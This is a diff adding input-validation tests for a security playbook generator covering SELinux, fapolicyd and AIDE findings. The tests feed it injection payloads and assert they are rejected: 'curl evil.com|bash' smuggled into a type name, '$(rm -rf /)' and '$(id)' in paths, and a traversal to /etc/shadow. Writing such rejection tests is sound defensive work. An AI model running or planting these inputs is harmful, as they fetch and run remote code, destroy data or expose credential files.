@@ -214,6 +214,65 @@ class TestAideRemediation:
         assert blast["files_accepted"] == 50
 
 
+class TestInputValidation:
+    """Verify injection attempts are rejected by sanitize functions."""
+
+    @pytest.mark.asyncio
+    async def test_denial_rejects_shell_injection_in_source(self):
+        result = await generate_playbook(
+            None, "denial",
+            source_type="httpd_t; curl evil.com|bash",
+            target_type="tmp_t", tclass="file", permission="read",
+        )
+        assert result.get("error") == "invalid_input"
+
+    @pytest.mark.asyncio
+    async def test_denial_rejects_shell_injection_in_path(self):
+        result = await generate_playbook(
+            None, "denial",
+            source_type="httpd_t", target_type="tmp_t",
+            tclass="file", permission="read",
+            path="/tmp/$(rm -rf /)",
+        )
+        assert result.get("error") == "invalid_input"
+
+    @pytest.mark.asyncio
+    async def test_file_context_rejects_bad_path(self):
+        result = await generate_playbook(
+            None, "file_context",
+            path="relative/../../../etc/shadow",
+        )
+        assert result.get("error") == "invalid_input"
+
+    @pytest.mark.asyncio
+    async def test_fapolicyd_rejects_bad_path(self):
+        result = await generate_playbook(
+            None, "fapolicyd_block",
+            path="/tmp/$(id)",
+        )
+        assert result.get("error") == "invalid_input"
+
+    @pytest.mark.asyncio
+    async def test_aide_rejects_bad_changed_paths(self):
+        result = await generate_playbook(
+            None, "aide_change",
+            changed_paths=["/etc/hosts", "not-absolute"],
+            action="accept",
+        )
+        assert result.get("error") == "invalid_input"
+
+    @pytest.mark.asyncio
+    async def test_denial_accepts_valid_selinux_types(self):
+        ssh = MockSSH({"sesearch": make_result("")})
+        result = await generate_playbook(
+            ssh, "denial",
+            source_type="httpd_t", target_type="user_home_t",
+            tclass="file", permission="read",
+        )
+        assert "error" not in result
+        assert result["finding_type"] == "denial"
+
+
 class TestUnknownFindingType:
     @pytest.mark.asyncio
     async def test_unknown_type(self):
